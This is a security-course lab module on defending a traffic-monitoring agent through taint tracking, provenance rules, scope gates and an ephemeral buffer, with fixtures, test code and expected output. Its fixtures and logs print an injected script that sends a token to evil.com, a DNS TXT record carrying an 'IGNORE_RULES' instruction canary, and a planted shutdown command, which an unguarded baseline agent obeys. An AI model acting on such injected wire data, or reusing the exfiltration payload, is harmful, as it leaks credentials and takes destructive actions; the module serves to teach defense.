# Module 9: InterceptBound — Traffic Interception & Taint Tracking

**Duration**: 1.5 hours | **Difficulty**: ⭐⭐⭐ | **Prerequisites**: Modules 4, 6 (provenance, injection)
**Demo directory**: `demo-09-interceptbound/`

---

## 🎯 Learning Objectives

By the end of this module, you will be able to:

1. **Model** intercepted traffic as typed frames (HTTP/DNS/TLS/custom) with per-frame provenance and taint levels
2. **Propagate** taint from frames through a parser to every extracted field, including nested structures
3. **Operate** an ephemeral buffer that bounds, expires, and zeroes its own copy of every parsed intercepted value
4. **Enforce** a downstream action guard with per-action taint ceilings and a provenance rule that keeps intercepted data out of sensitive operations (credential storage, system commands)
5. **Distinguish** scope blocking (source or destination not allowed) from taint blocking (data too dirty) — two different gates for two different questions

---

## 📖 Background: The Listener's Dilemma

An agent positioned to observe traffic (monitoring, relay, diagnostics) sees *everything* — including forgeries. Two attackers are in scope:

1. **The endpoint** — a compromised server sends poisoned responses (fake tokens, injected commands)
2. **The path** — a man-in-the-middle forges frames wholesale

The defense is a **taint lattice** attached to every datum, plus an **action guard** that asks, before any sensitive operation: *how dirty is the input, and where did it come from?* Every action has its own taint **ceiling** (observing is cheap; storing a credential is not), and the privileged actions additionally refuse intercepted provenance outright.

```
  TAINT LATTICE                    ACTION GUARD
┌────────────────────┐      ┌──────────────────────────────────────────┐
│ LOW    trusted     │      │ authorize(action, taint, provenance):    │
│ MEDIUM  clean wire │ ───► │   taint > ceiling(action)?      → BLOCK  │
│ HIGH   suspicious  │      │   ceiling LOW + intercepted?    → BLOCK  │
└────────────────────┘      │   else                          → ALLOW  │
                            └──────────────────────────────────────────┘
```

And a *third* gate upstream of everything: **scope**. Frames from sources (or to destinations) outside the allowed lists never even get parsed. Keep the three questions straight — this module's most common confusion is blending them:

| Gate | Question | Fails when… |
|------|----------|-------------|
| **Scope** | May I listen to this source at all? | Source or destination IP not allowlisted |
| **Taint** | Is this *datum* clean enough for this *action*? | Field's taint exceeds the action's ceiling |
| **Provenance** | Where did this come from? | Action is privileged (ceiling LOW) and the datum is `intercepted_network` — whatever its taint label says |

Plus the **ephemeral buffer**: every parsed value lives in a bounded, expiring buffer whose own byte copy is zeroed as soon as the frame is decided — because even defended pipelines hold transient secrets.

**Safety framing**: all frames are JSON fixtures. No sockets, no ARP, no capture. The demo simulates the *decision layer* only. `make verify-safety` holds.

### The eight frames

| Frame | Proto | Source | Provenance | Taint | Payload of interest |
|-------|-------|--------|------------|-------|---------------------|
| frame_001 | HTTP | .10 | intercepted | HIGH | JSON body with `token` (credential-like) |
| frame_002 | HTTP | .10 | intercepted | HIGH | HTML with `<script>fetch('http://evil.com/steal'…)</script>` injection |
| frame_003 | DNS | .1 | intercepted | HIGH | A record `10.0.0.50` + TXT record `CANARY_DNS_INJECTION_IGNORE_RULES` |
| frame_004 | TLS | .20 | intercepted | MEDIUM | clean handshake metadata |
| frame_005 | custom | .30 | intercepted | HIGH | stream with a `{"command": "shutdown", …}` chunk on the wire |
| frame_006 | HTTP | .10 | intercepted | MEDIUM | clean 401 response |
| frame_007 | HTTP | 10.0.0.99 | intercepted | HIGH | forged `token` from a source outside the allowlist |
| frame_008 | local | 127.0.0.1 | trusted_local | LOW | operator-supplied credential-rotation record with a `token` |

Two fields in every frame are the **answer key**, not input: `injection` (what the fixture author planted) and `expected` (what each agent should do). The agents never read them — the tests and the results generator do.

---

## 🛠️ Part 1: Frames and Parsing

### Step 1: Read the fixture and predict

```bash
cat demo-09-interceptbound/fixtures/traffic.json
```

**What this does**: Prints the eight frames, the scope policy (`allowed_sources` includes .10/.20/.30/.1 and 127.0.0.1; `allowed_destinations` is 192.168.1.100 and 127.0.0.1; the default taint ceiling for actions is `low`, with per-action `action_ceilings`: `record_observation: high`, `update_dns_cache: medium`, `store_credential: low`, `system_shutdown: low`), and the buffer config (size 1000, TTL 60s, secure delete on). Cover the `injection` and `expected` fields while you predict.

**Why it matters**: Note the policy tension you'll spend the module exploring: **the ceiling for storing a credential is `low`**, yet *every* intercepted frame carries taint ≥ MEDIUM — and the only LOW frame (frame_008) is the operator's own record, not traffic. Prediction table (fill before running):

| Frame | In scope? | Parsed fields | Sensitive action attempted? | Guard verdict |
|-------|-----------|---------------|------------------------------|---------------|
| frame_001 (token) | ? | ? | store_token | ? |
| frame_003 (DNS A + TXT) | ? | ? | update_dns_cache | ? |
| frame_004 (TLS) | ? | ? | — | ? |
| frame_005 (shutdown) | ? | ? | execute_shutdown | ? |
| frame_007 (forged token, 10.0.0.99) | ? | ? | store_token | ? |
| frame_008 (local rotation record) | ? | ? | store_token | ? |

Key prediction: with `store_credential` capped at LOW, *any* intercepted credential-like value must be blocked from storage — even though "observing" it was fine. Observing ≠ retaining ≠ acting. Three different privilege levels for three different operations. Which is the only frame that can store a token, and why?

---

### Step 2: Parse one frame and inspect taint propagation

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import json, sys
from pathlib import Path
sys.path.insert(0, "student")
from interceptbound import TaintTracker, TrafficFrame, Provenance, TaintLevel

raw = next(f for f in json.loads(Path("fixtures/traffic.json").read_text())["traffic_frames"]
           if f["id"] == "frame_001")
frame = TrafficFrame(raw["id"], raw["protocol"], raw["src"], raw["dst"], raw["direction"],
                     raw["fields"], Provenance(raw["provenance"]), TaintLevel(raw["taint"]),
                     raw["injection"])

for p in TaintTracker().parse_frame(frame):
    print(f"{p.name:28} taint={p.taint.value:6} prov={p.provenance.value}  val={str(p.value)[:40]}")
EOF
cd ..
```

**What this does**: Parses frame_001 and prints each extracted field with its taint and provenance. (The last constructor argument, `raw["injection"]`, is the fixture's answer key; the parser carries it on the frame but never reads it.)

**Why it matters**: Expected:
```
status                       taint=high   prov=intercepted_network  val=200
headers.Content-Type         taint=high   prov=intercepted_network  val=application/json
headers.Server               taint=high   prov=intercepted_network  val=nginx/1.18
body                         taint=high   prov=intercepted_network  val={"user": "alice", "contact": "alice@corp
```

Two properties to record:
1. **Taint is frame-wide**: every field extracted from a HIGH frame is HIGH — including the innocuous `status: 200`. Taint is conservative; refinement (downgrading `status`) is possible in richer systems but must be *justified*, never default.
2. **Nesting flattens with dotted names**: `headers.Content-Type` — the parser recurses dicts and lists (`answers[0].value` style) so every leaf is individually labeled. Unlabeled leaves are the classic taint-tracking hole.

---

## 🤖 Part 2: The Unguarded Baseline

### Step 3: Run the baseline agent

```bash
cd demo-09-interceptbound && PYTHONPATH=.. python3 student/interceptbound.py 2>&1 | sed -n '/Unguarded Baseline/,/^$/p' && cd ..
```

**What this does**: Runs the demo's baseline section — the same parser and detection rules as the defended agent, but no scope, no taint, no guard: every candidate action derived from the wire data is "executed".

**Why it matters** — expected (trimmed to the frames that matter):

```
--- Unguarded Baseline (no scope, no taint, no guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    ALLOWED: record_observation [status]
    ALLOWED: store_token [body]
  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
    ALLOWED: record_observation [query]
    ALLOWED: update_dns_cache [answers[0].value]
    ALLOWED: follow_instruction [answers[1].value_INJECTION]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    ALLOWED: execute_shutdown [payload_INJECTION]
  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
    ALLOWED: record_observation [status]
    ALLOWED: store_token [body]
```

The baseline executes `store_token` on frame_001 (storing an attacker-forgeable credential) and on frame_007 (a forged token from a host it should never have listened to), caches the poisoned DNS answer, follows the injected instructions in frames 002 and 003, and executes `execute_shutdown` on frame_005 — the `{"command": "shutdown"}` chunk sits in the payload itself, right after a benign `{"command": "status"}` chunk. Every one of these actions derives entirely from intercepted bytes. This is the Module 6 vulnerable agent again, but with *state* consequences: a poisoned token in a credential store outlives the session that injected it.

---

## 🛡️ Part 3: The Taint-Aware Agent

### Step 4: Run the defended agent

```bash
cd demo-09-interceptbound && PYTHONPATH=.. python3 student/interceptbound.py 2>&1 | sed -n '/Taint-Aware/,/^$/p' && cd ..
```

**What this does**: Runs the defended section: scope check → taint-aware parse → buffer storage → guard-gated actions → buffer purge for that frame.

**Why it matters** — expected (verbatim):

```
--- Taint-Aware Guarded (scope -> taint -> buffer -> guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: store_token (taint_too_high: high > low) [body]
    ALLOWED: record_observation [status]
  frame_002 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: process_injection (injection_detected: script_tag,js_exfil) [body_INJECTION]
    ALLOWED: record_observation [status]
  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
    BLOCKED: update_dns_cache (taint_too_high: high > medium) [answers[0].value]
    BLOCKED: process_injection (injection_detected: canary_marker,instruction_phrase) [answers[1].value_INJECTION]
    ALLOWED: record_observation [query]
  frame_004 (tls 192.168.1.20:443->192.168.1.100:54322, intercepted_network, taint medium):
    ALLOWED: record_observation [cert_fingerprint]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    BLOCKED: process_injection (injection_detected: privileged_command) [payload_INJECTION]
    BLOCKED: execute_shutdown (taint_too_high: high > low) [payload_INJECTION]
  frame_006 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint medium):
    ALLOWED: record_observation [status]
  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: process_frame (source_not_allowed: 10.0.0.99)
  frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
    ALLOWED: store_token [body]
```

Cross-reference with your Step 1 predictions. Note what was **allowed**: an observation from every in-scope intercepted frame, 001 through 006 (HIGH data may drive `record_observation`, whose ceiling is `high`), and exactly one privileged action — `store_token` on frame_008, because its provenance is `trusted_local`. Then record the *reasons* — the guard distinguishes:
- `taint_too_high` — data too dirty for the action: `high > low` for the token and the shutdown (frames 001, 005), `high > medium` for the DNS cache update (frame 003)
- `injection_detected` — a named detection rule matched the wire data (frames 002, 003, 005); the rule ids (`script_tag`, `canary_marker`, `privileged_command`, …) say which
- `source_not_allowed` — scope (frame 007 never reached the parser; Step 6 probes the destination gate too)

Three distinct failure reasons are audit gold: they let an operator tell *which defense* fired, and tune each independently. A fourth, `intercepted_network_cannot_drive_privileged_action`, appears in the full run's "Provenance rule" section — Step 5 shows where it comes from.

---

### Step 5: Probe the action guard's boundary

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import ActionGuard, TaintLevel, Provenance

# the fixture's policy: default ceiling LOW, plus per-action ceilings
g = ActionGuard(TaintLevel.LOW, {"record_observation": "high", "update_dns_cache": "medium",
                                 "store_credential": "low", "system_shutdown": "low"})
cases = [
    ("store_credential",   TaintLevel.LOW,    Provenance.TRUSTED_LOCAL),
    ("store_credential",   TaintLevel.LOW,    Provenance.INTERCEPTED_NETWORK),
    ("store_credential",   TaintLevel.MEDIUM, Provenance.INTERCEPTED_NETWORK),
    ("store_credential",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("update_dns_cache",   TaintLevel.MEDIUM, Provenance.INTERCEPTED_NETWORK),
    ("update_dns_cache",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("record_observation", TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("log_metric",         TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
]
for action, taint, prov in cases:
    ok, why = g.authorize(action, taint, "x", prov)
    print(f"{action:18} taint={taint.value:6} prov={prov.value:20} -> {'ALLOW' if ok else 'BLOCK'} ({why})")

print("\n-- same guard, default ceiling raised to MEDIUM --")
g2 = ActionGuard(TaintLevel.MEDIUM)
for taint in TaintLevel:
    ok, why = g2.authorize("report_finding", taint, "x", Provenance.INTERCEPTED_NETWORK)
    print(f"  report taint={taint.value:6} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
EOF
cd ..
```

**What this does**: Sweeps the guard across actions, taint levels and provenances with the fixture's ceilings, then re-sweeps an undeclared action with the default ceiling raised to MEDIUM.

**Why it matters**: Expected:

```
store_credential   taint=low    prov=trusted_local        -> ALLOW (authorized)
store_credential   taint=low    prov=intercepted_network  -> BLOCK (intercepted_network_cannot_drive_privileged_action)
store_credential   taint=medium prov=intercepted_network  -> BLOCK (taint_too_high: medium > low)
store_credential   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > low)
update_dns_cache   taint=medium prov=intercepted_network  -> ALLOW (authorized)
update_dns_cache   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > medium)
record_observation taint=high   prov=intercepted_network  -> ALLOW (authorized)
log_metric         taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > low)

-- same guard, default ceiling raised to MEDIUM --
  report taint=low    -> ALLOW (authorized)
  report taint=medium -> ALLOW (authorized)
  report taint=high   -> BLOCK (taint_too_high: high > medium)
```

Two rules compose. **Rule 1** is a taint ceiling per action: the field's taint must not exceed the ceiling of the action it would drive, and an action with no declared ceiling gets the default (`low` in the fixture) — fail closed. **Rule 2** concerns only privileged actions (ceiling LOW): intercepted-network data can never drive them, *whatever its taint label says* — row 2 passes rule 1 and is blocked by rule 2 alone. That is the attack rule 2 exists for: a refinement rule that is wrong (Exercise 9.2), or a label an attacker managed to launder, must not be enough to store a credential taken off the wire. In the second sweep the ceiling is MEDIUM, so the HIGH block is rule 1 at work, not rule 2 — rule 2 never fires for a non-privileged action. **Design question for your notes**: the `log_metric` case (HIGH taint, low-risk action) is *blocked*, not because logging is dangerous but because nobody declared a ceiling for it and the default is `low`. The guard gates actions by their sensitivity — but only the sensitivities someone wrote down. Where would you put `log_metric`'s ceiling, and what does it take to justify raising it?

---

### Step 6: Confirm scope is a separate gate

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import TaintAwareAgent, TrafficFrame, Provenance, TaintLevel

agent = TaintAwareAgent(
    {"allowed_sources": ["192.168.1.10"], "allowed_destinations": ["192.168.1.100"],
     "max_taint_for_action": "low"},
    {"max_size": 10, "ttl_seconds": 60, "secure_delete": True},
)
foreign_src = TrafficFrame("probe_src", "http", "10.0.0.1:80", "192.168.1.100:1", "response",
                           {"body": '{"command": "shutdown"}'}, Provenance.INTERCEPTED_NETWORK,
                           TaintLevel.HIGH)
foreign_dst = TrafficFrame("probe_dst", "http", "192.168.1.10:80", "203.0.113.5:1", "response",
                           {"body": '{"command": "shutdown"}'}, Provenance.INTERCEPTED_NETWORK,
                           TaintLevel.HIGH)
for f in (foreign_src, foreign_dst):
    print(agent.process(f))
EOF
cd ..
```

**What this does**: Feeds the defended agent two frames whose body is a `{"command": "shutdown"}` the detector would flag — one from a *disallowed* source, one from an allowed source to a *disallowed* destination.

**Why it matters**: Output:

```
{'frame': 'probe_src', 'actions': [], 'blocked': [{'action': 'process_frame', 'reason': 'source_not_allowed: 10.0.0.1'}], 'parsed_fields': 0, 'taint_tracked': False, 'exit': 'scope_blocked'}
{'frame': 'probe_dst', 'actions': [], 'blocked': [{'action': 'process_frame', 'reason': 'destination_not_allowed: 203.0.113.5'}], 'parsed_fields': 0, 'taint_tracked': False, 'exit': 'scope_blocked'}
```

`parsed_fields: 0`: neither frame reached the parser, so the shutdown command was never examined — no `process_injection`, no `execute_shutdown`, nothing in the buffer. Two lessons: (a) scope is a pre-filter that short-circuits everything, and both ends of the connection are checked, and (b) **the result has the same shape on every exit path** — `blocked` is always a list of dicts and `exit` says which gate closed (`scope_blocked` here and for frame_007 in Step 4; `ok` for every frame that was parsed), so a consumer cannot mistake a scope block for an empty result. (Exercise 9.3 adds a third scope question and must keep that shape.)

---

### Step 7: Inspect the observation log

```bash
cd demo-09-interceptbound && PYTHONPATH=.. python3 student/interceptbound.py 2>&1 | sed -n '/Observation log/,/^$/p' && cd ..
```

**What this does**: Prints the observation log each agent keeps — the one thing a defended interception agent is *allowed* to retain, a compact note per in-scope frame — so you can read the baseline's raw notes against the guarded agent's de-identified ones.

**Why it matters** — expected (verbatim):

```
--- Observation log: what each agent writes down ---
  Baseline (recorded in the clear):
    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
    tls 192.168.1.20:443 CN=api.internal.example
    custom 192.168.1.30:9999 DATA_CHUNK_1
    http 192.168.1.10:80 {"error": "unauthorized"}
    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
  Guarded (de-identified before recording):
    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
    tls HOST_ec1a:443 CN=api.internal.example
    custom HOST_ff75:9999 DATA_CHUNK_1
    http HOST_0272:80 {"error": "unauthorized"}
    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
```

`record_observation` was the action allowed for every in-scope frame in Step 4; this is what those observations actually contain. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note is passed through `shared/anonymize.py` (`Anonymizer.deidentify`) before it is recorded. The baseline keeps the same notes in the clear — its log still holds `alice`, `alice@corp.example`, and `DEMO_TOKEN_ABC123`. Three properties to record:

1. **Pseudonymize what still has to be analyzed**: source IPs and usernames become stable tags (`HOST_0272`, `USER_5aff`) and the synthetic `contact` e-mail becomes `EMAIL_e50e`. Stable means `192.168.1.10` is `HOST_0272` in frames 001, 002 and 006, so an analyst can still ask "which frames mention HOST_0272?" without learning the host — and can recover it locally with `agent.anon.reverse("HOST_0272")`, because the map lives on the machine that made it, never in the record.
2. **Redact what has no analytic use**: a token or password is destroyed (`[REDACTED]`), not tagged — there is nothing to preserve. The pass redacts secrets first, then pseudonymizes the identifiers that remain, so a secret that happens to look like an identifier is still destroyed.
3. **Scope bounds what is even observed**: frame_007 is out of scope (Step 6), so the guarded agent never records it — the guarded log has seven lines to the baseline's eight, and only the baseline holds frame_007's user and forged token. The summary line proves the property: `0 identities or secrets written in the clear`.

---

## 🧹 Part 4: The Ephemeral Buffer

### Step 8: Exercise TTL and secure deletion

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys, time; sys.path.insert(0, "student")
from interceptbound import EphemeralBuffer

buf = EphemeralBuffer(max_size=2, ttl_seconds=1, secure_delete=True)
buf.add("cred", "DEMO_TOKEN_ABC123")
raw = buf.raw_copy("cred")            # the buffer's own bytearray copy
print("immediately:", buf.get("cred"))

buf.delete("cred")
print("after delete:", buf.get("cred"), "| buffer's copy:", bytes(raw))

buf.add("expiring", "data")
time.sleep(1.1)
print("after TTL:  ", buf.get("expiring"))

for i in range(3):
    buf.add(f"k{i}", f"secret{i}")
print("after 3 adds at max_size=2:", len(buf), "live; k0 ->", buf.get("k0"))
print("stats:", buf.stats)
EOF
cd ..
```

**What this does**: Demonstrates all four buffer behaviors: immediate read, secure delete (the buffer's own `bytearray` copy is overwritten with zeros, then the entry is dropped), TTL expiry, and size eviction (oldest first, also zeroed).

**Why it matters**: Expected:

```
immediately: DEMO_TOKEN_ABC123
after delete: None | buffer's copy: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
after TTL:   None
after 3 adds at max_size=2: 2 live; k0 -> None
stats: {'stored': 5, 'zeroed': 3, 'expired': 1, 'evicted': 1}
```

Why does a *defended* pipeline hold intercepted credentials at all? Because parsing requires transient state. The buffer's job is to make that holding *bounded*: TTL caps lifetime, `max_size` caps volume, secure-delete zeroes the buffer's copy on delete, expiry, and eviction — and the agent purges every entry of a frame as soon as that frame is decided, which is why the full run ends with `Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evicted=0)`. The residual risk is what zeroing *cannot* reach: the `ParsedField` objects, the strings in printed lines, anything the OS swapped out — those copies are dropped, not zeroed. That is why the guard *also* blocks storing the value anywhere durable. Defense in depth: even the allowed holding is minimized. Record in notes what `secure_delete` can and cannot guarantee in Python (hint: object copies, GC, core dumps).

---

### Step 9: Run the test suite

```bash
cd demo-09-interceptbound && python3 -m pytest tests/ -v && cd ..
```

**What this does**: Runs all 44 tests (`44 passed`). Key pins:

| Test | Pins |
|------|------|
| `test_every_leaf_inherits_frame_label` | Every parsed field inherits frame taint + provenance + source — MEDIUM frames included |
| `test_taint_ceiling_per_action` / `test_provenance_rule_blocks_laundered_labels` | The Step 5 boundary, as assertions — rule 1 and rule 2 separately |
| `test_baseline_executes_from_wire_data_without_annotation` | Baseline *does* execute shutdown, from the payload alone (annotation stripped) |
| `test_guarded_blocks_shutdown` / `…_token_storage` | The two headline defenses |
| `test_guarded_allows_clean_observations` / `…_privileged_action_from_trusted_provenance` | Something is actually *allowed* (frames 004/006; frame_008's `store_token`) |
| `test_agent_actually_consults_the_guard` | Swaps in a permissive guard — a canned block would be caught |
| `test_source_scope_enforced_before_parsing` / `test_destination_scope_enforced` | frame_007 → `source_not_allowed: 10.0.0.99` with the parser never called; foreign destination blocked too |
| `test_dns_injection_detected_and_cache_update_blocked` | TXT canary caught by name; poisoned A record kept out of the cache |
| `test_detection_does_not_read_the_annotation` | Every verdict identical with the fixture's `injection` key stripped |
| `test_secure_delete_zeroes_the_buffers_copy` / `…_max_size_bounds_live_data…` / `…_ttl_expiry…` / `test_pipeline_releases_every_frame_it_decided` | Buffer semantics, and the per-frame purge |

**Why it matters**: Notice `test_source_scope_enforced_before_parsing` does two things: it uses a fixture frame that really fails scope (frame_007, from 10.0.0.99), and it replaces `parse_frame` with a spy to prove the parser was never called. A verdict-only test would pass against a scope gate that fires *after* parsing — pinning the order is what makes the test worth having. The same idea runs through `test_detection_does_not_read_the_annotation` and `test_agent_actually_consults_the_guard`: each asserts a *property* of the mechanism, not the presence of a fixture label.

---

## 🎯 Part 5: Exercises

### Beginner

**Exercise 9.1 — Replay detection.**
Add a `seen_nonces` set to the agent. Before processing, extract any `nonce` from JSON-ish payloads; if a nonce repeats within the TTL window, append `{"action": "process_frame", "reason": "replay_detected"}` to blocked. Demonstrate by processing frame_005 twice.

**What this teaches**: Interception defenses aren't just about content — temporal properties (replay) need state, and the buffer is where that state lives.

### Standard

**Exercise 9.2 — Taint refinement with justification.**
Implement `refine(field) -> taint` that downgrades `status`-type fields (numeric HTTP codes, TLS versions) from their frame's taint to MEDIUM, logging each refinement with a rule id. Re-run frame_001: `status` becomes MEDIUM while `body` stays HIGH. Then answer in notes: what attack does refinement enable if your rule list is wrong — and why does rule 2 limit the damage even then? (`test_exercise_taint_refinement_must_be_justified` is the starting point: a refined MEDIUM `status` may drive `record_observation`, never `store_credential`.) Add `test_refinement_only_for_allowlisted_fields`.

**What this teaches**: Taint *lattice* implies meet/join operations, but every downgrade is a policy claim that must be enumerated and auditable. Default-dirty, refine-with-receipts.

**Exercise 9.3 — Scope by protocol.**
Add a third scope question: an `allowed_protocols` list in the scope policy, checked in `_in_scope` after source and destination, returning `protocol_not_allowed: <protocol>` for anything else. Keep the uniform result shape from Step 6 (`exit: "scope_blocked"`, `parsed_fields: 0`, `blocked` a list of dicts). Add a fixture frame with an unlisted protocol and write its `expected` block (the results generator compares every verdict against that block and exits 1 on a mismatch, so a new frame without one fails the run). Add `test_protocol_scope_enforced`.

**What this teaches**: Security tooling is also software; every new gate must fail closed *and* report through the same shape, or downstream *consumers* start special-casing exits and fail open (imagine a dashboard that only knows how to read `source_not_allowed`). Normalize at the boundary.

### Extension

**Exercise 9.4 — Omission detection in sequences.**
Frames carry implicit sequence (frame_001…008). Implement a `SequenceWatcher` expecting contiguous per-source sequence numbers; a gap (frame dropped — perhaps *deliberately* dropped by an attacker suppressing a "revoked credential" message) raises a blocked entry `{"reason": "sequence_gap", "expected": n, "got": m}`. Test with a doctored fixture missing frame_003.

**What this teaches**: Integrity isn't only content — *absence* is an attack surface (Module 5's omission lesson, applied to streams).

**Exercise 9.5 — Credential-canary lifecycle.**
When a credential-like value is parsed (`credential_flags` non-empty — the `ContentDetector` rules `json_credential`, `kv_credential`, `bearer_token`): (1) never buffer the real value — buffer `sha256(value)[:12]` plus a canary `CANARY_CRED_<n>`; (2) emit a blocked entry `{"action": "store_token", "reason": "credential_canary_quarantined", "fingerprint": …}`. Demonstrate that the buffer never contains `DEMO_TOKEN_ABC123` but the audit log identifies which frame carried it. (`test_exercise_credential_canary` is the starting point.)

**What this teaches**: Data minimization as defense: you can *alert* on secrets without *possessing* them. The fingerprint preserves forensics; the secret never enters the pipeline.

---

## 📝 Lab Notes Questions

1. Frame_004 (TLS, MEDIUM, clean) and frame_001 (HTTP, HIGH) are both parsed, buffered, and *allowed* `record_observation`; only frame_001 attempts `store_token`, and is *blocked*. Explain exactly where the pipeline treated them differently, and why observing both was acceptable.
2. The guard has two blocking rules (per-action taint ceiling; privileged actions refuse `intercepted_network` provenance). Construct a case where rule 2 blocks something rule 1 would allow — the full run's `frame_001_relabelled_low` is one — and explain what attack rule 2 exists for.
3. The fixture's buffer keeps an entry for up to 60 seconds, and the agent purges each frame's entries as soon as the frame is decided — but zeroing reaches only the buffer's own copy. List the residual risks of that design and one mitigation for each (hint: memory, swaps, forks, exception paths).

---

## ✅ Completion Checklist

- [ ] Eight frames read; prediction table completed *before* running
- [ ] Taint propagation inspected (frame-wide, nested flattening)
- [ ] Baseline's store_token + execute_shutdown observed
- [ ] Defended agent's three distinct block reasons recorded, plus what was allowed (observations from frames 001–006; frame_008's store_token)
- [ ] Guard boundary swept at the fixture's ceilings and with the default raised to MEDIUM; rule-2 case identified
- [ ] Scope-vs-taint separation demonstrated with synthetic frames (source and destination)
- [ ] Observation log inspected; de-identification (stable pseudonyms, redacted secrets) and the frame_007 scope consequence noted
- [ ] Buffer TTL, eviction, and zeroing exercised; residual-risk note written
- [ ] All 44 tests pass; the parse-never-called scope test noted
- [ ] At least Beginner + Exercise 9.2 (refinement) — 9.2 is essential
- [ ] `LAB_NOTES.md` Module 9 block filled (seed 42, commit, `make demo DEMO=09`)

---

**⬅️ Prev: [Module 8](lab-08-inclusiontrap.md) | ➡️ Next: [Module 10: ScanBound](lab-10-scanbound.md)**
